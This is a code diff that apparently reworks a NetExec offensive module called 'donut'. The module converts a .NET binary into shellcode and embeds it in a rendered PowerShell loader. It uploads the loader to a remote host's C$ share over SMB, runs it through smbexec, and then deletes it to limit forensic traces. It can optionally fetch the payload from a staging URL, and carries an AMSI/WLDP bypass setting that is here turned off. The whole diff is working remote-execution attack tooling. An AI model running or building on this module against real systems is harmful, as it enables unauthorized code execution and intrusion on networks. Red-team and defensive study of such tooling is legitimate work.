@@ -1,17 +1,22 @@
-from nxc.logger import nxc_logger
+from jinja2 import Environment, FileSystemLoader
+from nxc.paths import DATA_PATH, TMP_PATH
+import os
+import time
 import donut
-import sys
 import hashlib
+import base64
+import tempfile
 
 class NXCModule:
     """
     Donut:
     -------
     Module by @Lavender-exe
+    PowerShell Loader by @EvilBytecode
     """
 
     name = "donut"
-    description = "Execute Assembly but in Netexec"
+    description = "Execute .NET Binaries Remotely using Donut"
     supported_protocols = ['smb']
     opsec_safe = True
     multiple_hosts = False
@@ -19,100 +24,171 @@ class NXCModule:
     def __init__(self):
         self.context = None
         self.module_options = None
+        self.tmp_directory = tempfile.gettempdir()
+        self.cleanup: bool  = False
+        self.remote_tmp_dir = "C:\\Windows\\Temp\\"
 
     def options(self, context, module_options):
         """Required.
-        BINARY_PATH Path to Dotnet Binary
-        URL         URL to host Donut Shellcode
-        OUTPUT      Shellcode File Name and Path
-        
-        Usage: nxc smb $IP -u Username -p Password -M donut -o BINARY_PATH='/tmp/Seatbelt.exe'
-            #    nxc smb $IP -u Username -p Password -M donut -o BINARY_PATH='/tmp/Seatbelt.exe' BYPASS=2 ENTROPY=1 OUTPUT='/tmp/Seatbelt.bin'
-        """
+        BINARY_PATH Path to DotNet Binary
+        BINARY_NAME Name of DotNet Binary
 
+        Optional:
+        USE_REMOTE  Specify whether the shellcode loader should grab from a remote host or local (True/[False])
+        STAGE_URL   Specify Stager IP/URL
+        OUTPUT      Shellcode File Name and Path
+
+        Usage: nxc smb $IP -u Username -p Password -M donut -o BINARY_PATH='/tmp/' BINARY_NAME=Seatbelt.exe PARAMS='antivirus'
+        Extra: nxc smb $IP -u Username -p Password -M donut -o BINARY_PATH='/tmp/' BINARY_NAME=Seatbelt.exe USE_REMOTE=True STAGE_URL=http://127.0.0.1:8080/ PARAMS='antivirus'
+
+        Remote URL is currently bugged, do not use the USE_REMOTE option
+        """
+        # Options
         self.path: str      = ""
-        self.url: str       = ""
+        self.name: str      = ""
+        self.output: str    = ""
+
+        # Preset Options
+        self.share: str     = "C$"
         self.arch: int      = 3 # AMD64+x86
         self.bypass: int    = 1 # Disable AMSI and WLDP bypass - detected
-        self.entropy: int   = None # Default is 3
-        self.cls: str       = ""
-        self.method: str    = ""
-        self.params: str    = ""
-        self.runtime: str   = ""
-        self.appdomain: str = ""
-        self.cleanup: bool  = False
+        self.entropy: int   = 3 # Default is 3
+        self.format: int    = 8
 
-        if "PATH" in module_options:
-            self.path = module_options["PATH"]
+        # Misc
+        self.extension: str = ""
+        self.tmp_share = self.remote_tmp_dir.split(":")[1]
 
-        if "URL" in module_options:
-            self.url = module_options["URL"]
+        # Jinja
+        self.shellcode: str = ""
+        self.remote_url: str = ""
+        self.use_remote: bool = False
 
-        if "ARCH" in module_options:
-            self.arch = module_options["ARCH"]
+        match self.format:
+            case 1:
+                self.extension = ".exe"
+            case 2:
+                self.extension = ".bs64"
+            case 3:
+                self.extension = ".rb"
+            case 4:
+                self.extension = ".c"
+            case 5:
+                self.extension = ".py"
+            case 6:
+                self.extension = ".ps1"
+            case 7:
+                self.extension = ".cs"
+            case 8:
+                self.extension = ".hex"
+            case _:
+                context.log.error("Invalid Format")
 
-        if "BYPASS" in module_options:
-            self.bypass = module_options["BYPASS"]
+        if "BINARY_PATH" in module_options:
+            self.path = module_options["BINARY_PATH"]
 
-        if "ENTROPY" in module_options:
-            self.entropy = module_options["ENTROPY"]
-
-        if "CLS" in module_options:
-            self.cls = module_options["CLS"]
-
-        if "METHOD" in module_options:
-            self.method = module_options["METHOD"]
+        if "BINARY_NAME" in module_options:
+            self.name = module_options["BINARY_NAME"]
+        self.filename = self.name.split(".")[0]
 
         if "PARAMS" in module_options:
             self.params = module_options["PARAMS"]
 
-        if "RUNTIME" in module_options:
-            self.runtime = module_options["RUNTIME"]
+        if "OUTPUT" in module_options:
+            self.output = module_options["OUTPUT"]
+        else:
+            self.output = f"{self.tmp_directory}/{self.filename}{self.extension}"
 
-        if "APPDOMAIN" in module_options:
-            self.appdomain = module_options["APPDOMAIN"]
+        if "USE_REMOTE" in module_options:
+            self.use_remote = module_options["USE_REMOTE"]
 
-    def generate_shellcode(self, module_options):
-        """
-        
-        """
+        if "STAGE_URL" in module_options and "USE_REMOTE" in module_options:
+            self.remote_url = module_options["STAGE_URL"]
+
+        else:
+            timestamp = time.strftime("%Y%m%d_%H%M%S")
+            self.modname = f"{self.tmp_directory}/{self.filename}_{timestamp}"
+
         try:
-            shellcode = donut.create(**module_options)
+            context.log.debug(f"Binary Selected: {self.name}")
+            context.log.debug(f"Output Path: {self.output}")
+            context.log.debug(f"Architecture: {self.arch}")
+            context.log.debug(f"Bypass Method: {self.bypass}")
+            context.log.debug(f"Entropy: {self.entropy}")
 
-            md5sum    = hashlib.md5(shellcode).hexdigest()
-            sha256sum = hashlib.sha256(shellcode).hexdigest()
+            binary = os.path.join(self.path, self.name)
 
-            context.log.highlight(f"MD5 Hash of Shellcode: {md5sum}")
-            context.log.highlight(f"SHA256 Hash of Shellcode: {sha256sum}")
-            context.log.success("Shellcode Created!")
+            self.shellcode = donut.create(
+                file=binary,
+                output=self.output,
+                arch=self.arch,
+                bypass=self.bypass,
+                entropy=self.entropy,
+                format=self.format,
+                params=self.params
+            )
+
+            self.md5sum_shc    = hashlib.md5(self.shellcode).hexdigest()
+            self.sha256sum_shc = hashlib.sha256(self.shellcode).hexdigest()
+
+            context.log.display(f"MD5 Hash of Shellcode [{self.output}]: {self.md5sum_shc}")
+            context.log.display(f"SHA256 Hash of Shellcode [{self.output}]: {self.sha256sum_shc}")
+            context.log.success(f"Shellcode Created at {self.output}!")
+
+            context.log.debug(f"Use Remote: {self.use_remote}")
+            context.log.debug(f"Remote URL: {self.remote_url}")
+            # context.log.debug(f"Shellcode: {self.shellcode}")
+
+            b64_shellcode = base64.b64encode(self.shellcode).decode('utf-8')
+
+            env = Environment(loader= FileSystemLoader(f"{DATA_PATH}/donut_module/"))
+            template = env.get_template('shellcode_ldr.jinja')
+            rendered = template.render(
+                USE_REMOTE     = self.use_remote,
+                REMOTE_URL     = self.remote_url,
+                SHELLCODE      =  b64_shellcode,
+                SHELLCODE_FILE = f"{self.filename}{self.extension}",
+            )
+
+            self.loader_out = f"{self.tmp_directory}/loader.ps1"
+            with open(self.loader_out, 'w+') as loader_file:
+                print(rendered, file=loader_file)
+
+            # self.md5sum_ldr = hashlib.md5(loader_out).hexdigest()
+            # self.sha256sum_ldr = hashlib.sha256(loader_out).hexdigest()
+
+            # context.log.display(f"MD5 Hash of Loader [{self.output}]: {self.md5sum_ldr}")
+            # context.log.display(f"SHA256 Hash of Loader [{self.output}]: {self.sha256sum_ldr}")
+            # context.log.success(f"Loader Created at {loader_out}!")
 
         except Exception as e:
             context.log.exception(f"Exception Occurred: {e}")
 
+
     def on_login(self, context, connection):
-        """
-        1. Generate Shellcode
-        2. Write loader to temp directory
-        3. Execute Shellcode remotely via loader
-        4. Send Output to User
-        5. Delete Loader
-        """
+        self.connection =  connection
+        self.context = context
 
-        # Logging best practice
-        # Mostly you should use these functions to display information to the user
-        # context.log.display("I'm doing something")  # Use this for every normal message ([*] I'm doing something)
-        # context.log.success("I'm doing something")  # Use this for when something succeeds ([+] I'm doing something)
-        # context.log.fail("I'm doing something")  # Use this for when something fails ([-] I'm doing something), for example a remote registry entry is missing which is needed to proceed
-        # context.log.highlight("I'm doing something")  # Use this for when something is important and should be highlighted, printing credentials for example
+        try:
+            with open(self.loader_out, 'r') as loader:
+                self.connection.conn.putFile(self.share, self.tmp_share + "loader.ps1", loader.read)
+                self.context.log.success(f"[OPSEC] Created file loader.ps1 on \\\\{self.share}{self.tmp_share}")
+        
+        except Exception as e:
+            self.context.log.fail(f"Error writing file to share {self.share}: {e}")
 
-        # # These are for debugging purposes
-        # context.log.info("I'm doing something")  # This will only be displayed if the user has specified the --verbose flag, so add additional info that might be useful
-        # context.log.debug("I'm doing something")  # This will only be displayed if the user has specified the --debug flag, so add info that you would might need for debugging errors
+        try:
+            self.context.log.display(f"Executing Loader")
+            loader_path = f". {self.remote_tmp_dir}\\loader.ps1"
+            self.connection.execute(loader_path, methods=["smbexec"])
+        except Exception as e:
+            self.context.log.fail("Error executing the loader")
+        finally:
+            self.delete_loader()
 
-        # # These are for more critical error handling
-        # context.log.error("I'm doing something")  # This will not be printed in the module context and should only be used for critical errors (e.g. a required python file is missing)
-        # try:
-        #     raise Exception("Exception that might have occurred")
-        # except Exception as e:
-        #     context.log.exception(f"Exception occurred: {e}")  # This will display an exception traceback screen after an exception was raised and should only be used for critical errors
-
+    def delete_loader(self):
+        try:
+            self.connection.conn.deleteFile(self.share, self.tmp_share + "loader.ps1")
+            self.context.log.success('[OPSEC] Successfully deleted the loader')
+        except Exception as e:
+            self.context.log.fail(f"[OPSEC] Failed to delete the loader file in: {self.remote_tmp_dir}: {e}")
